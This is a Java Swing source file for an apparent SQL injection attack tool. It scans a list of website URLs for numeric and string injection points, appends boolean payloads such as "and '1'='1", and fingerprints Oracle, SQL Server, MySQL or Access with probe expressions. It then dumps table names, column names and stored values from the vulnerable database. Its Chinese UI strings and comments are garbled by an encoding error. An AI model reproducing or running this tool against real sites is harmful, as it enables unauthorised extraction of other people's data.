package com.graphicaluserinterface;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;


import javax.swing.BoxLayout;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JDialog;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextField;
import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;
import javax.swing.table.DefaultTableModel;

import com.database.ConnectDatabase;
import com.sql.GetColumnName;
import com.sql.GetColumnValue;
import com.sql.GetTableName;
import com.sql.IsExistInjection;

public class SqlInjectionDetection extends JDialog{
	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	HashSet<String> urlList;
	JComboBox websiteList;
	IsExistInjection is;
	JTextField resultOfDetection;
	JButton detectAll;
	JButton parseTableBtn;
	JButton parseColumnBtn;
	JButton parseValueBtn;
	Thread findInjection;
	ConnectDatabase connect=ConnectDatabase.getInstance();
	DetectAllList detectAllList;
	
	boolean flagOfDetectAll=true;
	
	JLabel processInform;   //���·���������ʾ
	
	
	
	private String url;
	public String urlHead;
	public String urlEnd;
	public int DBType; // 0 oracle,1 SQLServer 2 MySql,3 Access
	
	public List<String> table;
	DefaultTableModel showTable;
	MyTable showTableTable;
	GetTableName getTableName;
	Thread threadOfGetTableName;
	
	public List<String> column;
	DefaultTableModel showColumn;
	MyTable showColumnTable;
	GetColumnName getColumnName;
	Thread threadOfGetColumnName;
	
	public List<List<String>> value;
	DefaultTableModel showValue;
	MyTable showValueTable;
	GetColumnValue getColumnValue;
	Thread threadOfGetColumnValue;
	
	JLabel databaseInform;
	public SqlInjectionDetection(HashSet<String> urlList) {
		// TODO Auto-generated constructor stub
		//��Ĭ�ϴ��ڷ������ΪWINDOWS���
		try {
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InstantiationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (UnsupportedLookAndFeelException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} 
		this.urlList=urlList;
		
		setTitle("SQLע����");
		setLayout(new BorderLayout());
		setSize(600, 450);
		setLocation(400,300);
		setResizable(false);
		setModal(true);
		
		/*��վ�б�©��ҳ��*/
		JPanel sqlWebsitePan=new JPanel();
		sqlWebsitePan.setLayout(new BoxLayout(sqlWebsitePan, BoxLayout.Y_AXIS));
			/*��վ�б�*/
		JPanel websiteListPan=new JPanel();
		JLabel listDesc=new JLabel("��վ�б�:");
		websiteList=new JComboBox();
		websiteList.setPreferredSize(new Dimension(300, 20));
		websiteListAdd(websiteList);
		JButton detect=new JButton("���");
		detectAll=new JButton("���ȫ��");
		websiteListPan.add(listDesc);
		websiteListPan.add(websiteList);
		websiteListPan.add(detect);
		websiteListPan.add(detectAll);
		sqlWebsitePan.add(websiteListPan);
			/*��վ�б�*/
			/*©��ҳ��*/
		JPanel websiteExistInjectionPan=new JPanel();
		JLabel siteDesc=new JLabel("©��ҳ��:");
		resultOfDetection=new JTextField();
		resultOfDetection.setEditable(false);
		resultOfDetection.setPreferredSize(new Dimension(450, 20));
		websiteExistInjectionPan.add(siteDesc);
		websiteExistInjectionPan.add(resultOfDetection);
		sqlWebsitePan.add(websiteExistInjectionPan);
			/*©��ҳ��*/
		detect.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				// TODO Auto-generated method stub
				url=websiteList.getSelectedItem().toString();
				is=new IsExistInjection(url);
				parseTableBtn.setEnabled(false);
				parseColumnBtn.setEnabled(false);
				parseValueBtn.setEnabled(false);
				if(is.isExistVariable())
					if(is.locationOfNumberInjection()!=-1){
						resultOfDetection.setText(websiteList.getSelectedItem().toString()+"    ������ֵ��ע��λ��:"+is.locationOfNumberInjection());
						urlHead = url.substring(0, is.locationOfNumberInjection());
						urlEnd = url.substring(is.locationOfNumberInjection());
						urlHead = urlHead + "%20and%20";
						DBType=getDBType();
						switch(DBType){
						case 0:
							databaseInform.setText("Oracle");
							break;
						case 1:
							databaseInform.setText("SQLServer");
							break;
						case 2:
							databaseInform.setText("MySQL");
							break;
						case 3:
							databaseInform.setText("Access");
							break;
						}
						parseTableBtn.setEnabled(true);
					}else	if(is.locationOfCharInjection()!=-1){
						resultOfDetection.setText(websiteList.getSelectedItem().toString()+"    �����ַ���ע��λ��:"+is.locationOfCharInjection());
						urlHead = url.substring(0,is.locationOfCharInjection() );
						urlEnd = url.substring(is.locationOfCharInjection());
						urlHead = urlHead + "'%20and%20";
						urlEnd = "%20and%20'1'='1" + urlEnd;// �պ���'
						DBType=getDBType();
						switch(DBType){
						case 0:
							databaseInform.setText("Oracle");
							break;
						case 1:
							databaseInform.setText("SQLServer");
							break;
						case 2:
							databaseInform.setText("MySQL");
							break;
						case 3:
							databaseInform.setText("Access");
							break;
						}
						parseTableBtn.setEnabled(true);
					}else
						resultOfDetection.setText(websiteList.getSelectedItem().toString()+"    δ��⵽ע��");
				else
					resultOfDetection.setText(websiteList.getSelectedItem().toString()+"    url�����ڱ�����ֵ");
			}
		});
		detectAll.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				// TODO Auto-generated method stub
				if(flagOfDetectAll==true){
					parseTableBtn.setEnabled(false);
					parseColumnBtn.setEnabled(false);
					parseValueBtn.setEnabled(false);
					detectAllList=new DetectAllList();
					findInjection=new Thread(detectAllList);
					findInjection.start();
					flagOfDetectAll=false;
					detectAll.setText("ֹͣ���");
				}else{
					detectAllList.stop();
					flagOfDetectAll=true;
					detectAll.setText("���ȫ��");
				}
			}
		});
		
		JPanel databaseInformPan=new JPanel();
		databaseInformPan.setLayout(new FlowLayout(FlowLayout.LEFT,42,5));
		databaseInformPan.add(new JLabel("���ݿ�����:"));
		databaseInform=new JLabel();
		databaseInformPan.add(databaseInform);
		sqlWebsitePan.add(databaseInformPan);
		
		
		this.add(sqlWebsitePan,BorderLayout.NORTH);
		/*��վ�б�©��ҳ��*/
		
		/*�½��*/
		JPanel sqlDataPan=new JPanel();
		sqlDataPan.setLayout(new FlowLayout(FlowLayout.CENTER,30,20));
		

		
			/*�½����*/
		JPanel sqlDataTablePan=new JPanel();
		sqlDataTablePan.setLayout(new BorderLayout());
		parseTableBtn=new JButton("������");
		parseTableBtn.setEnabled(false);
		
		showTable=new DefaultTableModel();
		showTableTable=new MyTable();
		showTableTable.setModel(showTable);
		showTable.addColumn("����");
		JScrollPane scrollTablePan=new JScrollPane(showTableTable);
		scrollTablePan.setPreferredSize(new Dimension(150, 200));
		sqlDataTablePan.add(parseTableBtn,BorderLayout.NORTH);
		sqlDataTablePan.add(scrollTablePan,BorderLayout.CENTER);
		
		parseTableBtn.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				// TODO Auto-generated method stub
				if(parseTableBtn.getText()=="������"){
					List<String> tableName=connect.selectByTableName("tablename");
					showTableTable.removeAll();
					showTable=new DefaultTableModel();
					showTableTable.setModel(showTable);
					showTable.addColumn("����");
					table=new ArrayList<String>();
					getTableName=new GetTableName(url,urlHead, urlEnd,parseTableBtn,parseColumnBtn,showTable,table,tableName);
					threadOfGetTableName=new Thread(getTableName);
					threadOfGetTableName.start();
					parseTableBtn.setText("ֹͣ���");
				}else{
					getTableName.stop();
					if(!table.isEmpty())
						parseColumnBtn.setEnabled(true);
				}
			}
		});
			/*�½����*/
		
		
			/*�½�����*/
		JPanel sqlDataColumnPan=new JPanel();
		sqlDataColumnPan.setLayout(new BorderLayout());
		parseColumnBtn=new JButton("�������");
		parseColumnBtn.setEnabled(false);
	
		showColumn=new DefaultTableModel();
		showColumnTable=new MyTable();
		showColumnTable.setModel(showColumn);
		showColumn.addColumn("����");
		JScrollPane scrollColumnPan=new JScrollPane(showColumnTable);
		scrollColumnPan.setPreferredSize(new Dimension(150, 200));

		sqlDataColumnPan.add(parseColumnBtn,BorderLayout.NORTH);
		sqlDataColumnPan.add(scrollColumnPan,BorderLayout.CENTER);
		
		parseColumnBtn.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				if(parseColumnBtn.getText()=="�������"){
//					List<String> columnName=connect.selectByTableName("");
					List<String> columnName=connect.selectByTableName("columnname");
					showColumnTable.removeAll();
					showColumn=new DefaultTableModel();
					showColumnTable.setModel(showColumn);
					showColumn.addColumn("����");
					column=new ArrayList<String>();
					getColumnName=new GetColumnName(url,urlHead, urlEnd,parseColumnBtn,parseValueBtn,showColumn,column,table.get(showTableTable.getSelectedRow()),columnName);
					threadOfGetColumnName=new Thread(getColumnName);
					threadOfGetColumnName.start();
					parseColumnBtn.setText("ֹͣ���");
				}else{
					getColumnName.stop();
					if(!column.isEmpty())
						parseValueBtn.setEnabled(true);
				}
				
			}
		});
			/*�½�����*/
		
			/*�½���ֵ*/
		JPanel sqlDataValuePan=new JPanel();
		sqlDataValuePan.setLayout(new BorderLayout());
		parseValueBtn=new JButton("�������");
		parseValueBtn.setEnabled(false);
		showValue=new DefaultTableModel();
		showValueTable=new MyTable();
		showValueTable.setModel(showValue);
		showValue.addColumn("����");
		JScrollPane scrollValuePan=new JScrollPane(showValueTable);
		scrollValuePan.setPreferredSize(new Dimension(150, 200));
		sqlDataValuePan.add(parseValueBtn,BorderLayout.NORTH);
		sqlDataValuePan.add(scrollValuePan,BorderLayout.CENTER);
		
		
		parseValueBtn.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				if(parseValueBtn.getText()=="�������"){
					showValueTable.removeAll();
					showValue=new DefaultTableModel();
					showValueTable.setModel(showValue);
					showValue.addColumn("����");
					List<String> selectedColumn=new ArrayList<String>();
					int[] s=showColumnTable.getSelectedRows();
					int i=0;
					while(i<s.length){
						selectedColumn.add(showColumnTable.getValueAt(s[i], 0).toString());
						i++;
					}
					Iterator<String> it=selectedColumn.iterator();
					while(it.hasNext()){
						showValue.addColumn(it.next().toString());
					}
					value=new ArrayList<List<String>>();
					getColumnValue=new GetColumnValue(url, urlHead, urlEnd, parseValueBtn, showValue, value, table.get(showTableTable.getSelectedRow()), selectedColumn, DBType);
					threadOfGetColumnValue=new Thread(getColumnValue);
					threadOfGetColumnValue.start();
					parseValueBtn.setText("ֹͣ���");
				}else{
					getColumnValue.stop();
				}
			}
		});
		
		
			/*�½���ֵ*/
		
		
		 
		
		sqlDataPan.add(sqlDataTablePan);
		sqlDataPan.add(sqlDataColumnPan);
		sqlDataPan.add(sqlDataValuePan);
		/*�½��*/
		this.add(sqlDataPan,BorderLayout.CENTER);
		
		JPanel bottomPan=new JPanel();
		bottomPan.setLayout(new BoxLayout(bottomPan, BoxLayout.Y_AXIS));
		
		/*ѡ�����*/
		JPanel buttonPan=new JPanel();
		buttonPan.setLayout(new FlowLayout(FlowLayout.RIGHT,40,10));
		JButton btnOk=new JButton("ȷ��");
		JButton btnCancle=new JButton("ȡ��");
		/*������ʾ*/
		JPanel processPan=new JPanel();
		processPan.setLayout(new FlowLayout(FlowLayout.LEFT,30,10));
		processInform=new JLabel();
		processInform.setPreferredSize(new Dimension(500, 20));
		IsExistInjection.giveLabel(processInform);
		processPan.add(processInform);
		/*������ʾ*/
		btnOk.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				// TODO Auto-generated method stub
				dispose();
			}
		});
		btnCancle.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				// TODO Auto-generated method stub
				dispose();
			}
		});
		buttonPan.add(btnOk);
		buttonPan.add(btnCancle);
		bottomPan.add(processPan);
		bottomPan.add(buttonPan);
		/*ѡ�����*/
		this.add(bottomPan,BorderLayout.SOUTH);
		
		
		setVisible(true);
	}
	private void websiteListAdd(JComboBox websiteList) {
		// TODO Auto-generated method stub
		if(this.urlList!=null){
			Iterator<String> it=this.urlList.iterator();
			while(it.hasNext()){
				websiteList.addItem(it.next().toString());
			}
		}
	}
	public class DetectAllList implements Runnable{

		boolean stop;
		@Override
		public void run() {
			// TODO Auto-generated method stub
			int flag=0;
			while(flag!=-1&&flag<websiteList.getItemCount()&&stop==false)
			{
				url=websiteList.getSelectedItem().toString();
				is=new IsExistInjection(url);
				if(is.locationOfNumberInjection()!=-1){
					flag=-1;
					resultOfDetection.setText(websiteList.getSelectedItem().toString()+"    ������ֵ��ע��λ��:"+is.locationOfNumberInjection());
					urlHead = url.substring(0, is.locationOfNumberInjection());
					urlEnd = url.substring(is.locationOfNumberInjection());
					urlHead = urlHead + "%20and%20";
					DBType=getDBType();
					switch(DBType){
					case 0:
						databaseInform.setText("Oracle");
						break;
					case 1:
						databaseInform.setText("SQLServer");
						break;
					case 2:
						databaseInform.setText("MySQL");
						break;
					case 3:
						databaseInform.setText("Access");
						break;
					}
					parseTableBtn.setEnabled(true);
				}
				else	if(is.locationOfCharInjection()!=-1){
					flag=-1;
					resultOfDetection.setText(websiteList.getSelectedItem().toString()+"    �����ַ���ע��λ��:"+is.locationOfCharInjection());
					urlHead = url.substring(0, is.locationOfCharInjection());
					urlEnd = url.substring(is.locationOfCharInjection());
					urlHead = urlHead + "'%20and%20";
					urlEnd = "%20and%20'1'='1" + urlEnd;// �պ���'
					DBType=getDBType();
					switch(DBType){
					case 0:
						databaseInform.setText("Oracle");
						break;
					case 1:
						databaseInform.setText("SQLServer");
						break;
					case 2:
						databaseInform.setText("MySQL");
						break;
					case 3:
						databaseInform.setText("Access");
						break;
					}
					parseTableBtn.setEnabled(true);
				}else{
					if(websiteList.getSelectedIndex()<websiteList.getItemCount()-1)
						websiteList.setSelectedIndex(websiteList.getSelectedIndex()+1);
				}
				if(flag!=-1)
					flag++;
				if(stop==false)
					detectAll.setText("���ȫ��");
			}
			
		}
		public void stop(){
			stop=true;
		}
	}
	public int getDBType() {
		int i = 0;
		String sql[] = { "exists(select%20banner%20from%20v$version)",
				"user>0", "version()>1" };
		for (i = 0; i < 3; i++) {
			String urlChanged = urlHead + sql[i] + urlEnd;
			if (IsExistInjection.isSamePage(this.url, urlChanged))
				break;
		}
		return i;
	}
}
